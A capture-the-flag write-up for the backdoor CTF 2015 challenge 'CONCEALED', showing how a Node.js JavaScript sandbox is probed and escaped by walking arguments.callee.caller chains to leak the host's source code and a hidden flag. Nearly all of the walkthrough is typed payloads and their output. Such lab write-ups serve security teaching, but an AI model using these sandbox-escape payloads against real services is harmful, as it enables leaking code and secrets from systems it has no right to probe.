# backdoor CTF 2015: [CONCEALED](https://backdoor.sdslabs.co/challenges/CONCEALED)

**Category:** Exploit
**Points:** 225
**Author:** [Amanpreet Singh](https://backdoor.sdslabs.co/users/apsdehal)
**Difficulty:** TODO
**Solves:** 24
**Description:**

* <https://backdoor.sdslabs.co/challenges/CONCEALED>

> All paths have been concealed. Get the hidden flag: `nc hack.bckdr.in 8005`. Submit sha-256 of the flag

## Write-up

Let’s connect to the service:

```bash
$ nc hack.bckdr.in 8005
######################################
####           CONCEAL            ####
######################################

Welcome to CONCEAL
You have access to object named sandboxed and its functions
Rest everything is sandboxed, don’t be a jerk and break something
Wrap your code in a function and return what you want as output
Flag is hidden somewhere in the code.
Get the flag :D!

home@jail:$
```

The welcome message reveals that the flag is hidden in the source code running the service. Some initial testing reveals it’s a JavaScript sandbox:

```
home@jail:$ sandboxed
TypeError: Property 'sandboxed' of object #<Object> is not a function

home@jail:$ function() { return sandboxed; }
[object Object]

home@jail:$ function() { return Object.keys(sandboxed); }
readFlag,print

home@jail:$ sandboxed.readFlag
flag: wrong_flag

home@jail:$ function() { return sandboxed.readFlag; }
function () {
  text = 'flag: wrong_flag';
  return text;
}

home@jail:$ sandboxed.print
undefined

undefined

home@jail:$ function() { return sandboxed.print; }
function (data) {
  sys.print(data + '\n' + '\n');
}
```

It’s possible to crash the application, which reveals a small part of the source code, but not the flag:

```
home@jail:$ function() { return this; }

/index.js:76
                sys.print(data + '\n');
                               ^
TypeError: Cannot convert object to primitive value
    at /index.js:76:20
    at /node_modules/prompt/lib/prompt.js:316:32
    at /node_modules/prompt/node_modules/utile/node_modules/async/lib/async.js:142:25
    at assembler (/node_modules/prompt/lib/prompt.js:313:9)
    at /node_modules/prompt/lib/prompt.js:322:32
    at /node_modules/prompt/lib/prompt.js:599:5
    at Interface.onLine (/node_modules/prompt/node_modules/read/lib/read.js:111:5)
    at Interface.emit (events.js:95:17)
    at Interface._onLine (readline.js:203:10)
    at Interface.<anonymous> (readline.js:323:12)
```

In JavaScript function contexts, `arguments.callee` refers to the currently executing function. As a result, `arguments.callee.caller` refers to the function that called the current one (i.e. one level up the call stack). This enables us to find out how the sandbox wraps our input:

```
home@jail:$ function() { return String(arguments.callee.caller); }
function () {return (function() { return String(arguments.callee.caller); })()}
```

So, our input gets wrapped in `function () {return ($INPUT)()}` and executed in a sandbox. But what is the `caller` of that function?

```
home@jail:$ function() { return String(arguments.callee.caller.caller); }
function () {
        if (!(this instanceof Script)) {
          throw new TypeError('invalid call to ' + f);
        }
        return ns[f].apply(ns, arguments);
      }
```

A-ha! We’re slowly revealing more and more source code, but no flag so far.  We need to go deeper!

Eventually we end up with the following payload which reveals the flag as part of a source code comment:

```
home@jail:$ function() { return String(arguments.callee.caller.caller.caller.caller.caller.caller.caller.caller.caller); }
function (err, line) {

    // flag : [redacted]

    if (err && wait === false) {
      return callback(err);
    }

    var against = {},
        numericInput,
        isValid;

    if (line !== '') {
      if (schema.properties[propName]) {
        var type = (schema.properties[propName].type || '').toLowerCase().trim() || undefined;

        //
        // Attempt to parse input as a float if the schema expects a number.
        //
        if (type == 'number') {
          numericInput = parseFloat(line, 10);
          if (!isNaN(numericInput)) {
            line = numericInput;
          }
        }

        //
        // Attempt to parse input as a boolean if the schema expects a boolean
        //
        if (type == 'boolean') {
          if(line === "true") {
            line = true;
          }
          if(line === "false") {
            line = false;
          }
        }

        //
        // If the type is an array, wait for the end. Fixes #54
        //
        if (type == 'array') {
          var length = prop.schema.maxItems;
          if (err) {
            if (err.message == 'canceled') {
              wait = false;
              stdout.write('\n');
            }
          }
          else {
            if (length) {
              if (tmp.length + 1 < length) {
                isValid = false;
                wait = true;
              }
              else {
                isValid = true;
                wait = false;
              }
            }
            else {
              isValid = false;
              wait = true;
            }
            tmp.push(line);
          }
          line = tmp;
        }
      }

      against[propName] = line;
    }

    if (prop && prop.schema.before) {
      line = prop.schema.before(line);
    }

    // Validate
    if (isValid === undefined) isValid = prompt._performValidation(name, prop, against, schema, line, callback);

    if (!isValid) {
      return prompt.getInput(prop, callback);
    }

    //
    // Log the resulting line, append this `property:value`
    // pair to the history for `prompt` and respond to
    // the callback.
    //
    logger.input(line.yellow);
    prompt._remember(propName, line);
    callback(null, line);

    // Make sure `tmp` is emptied
    tmp = [];
  }
```

Now that we have the flag, all that’s left to do is to hash it using SHA-256 so it can be submitted:

```bash
$ printf "$flag" | sha256sum
```

## Other write-ups and resources

* <http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-concealed-writeup/>
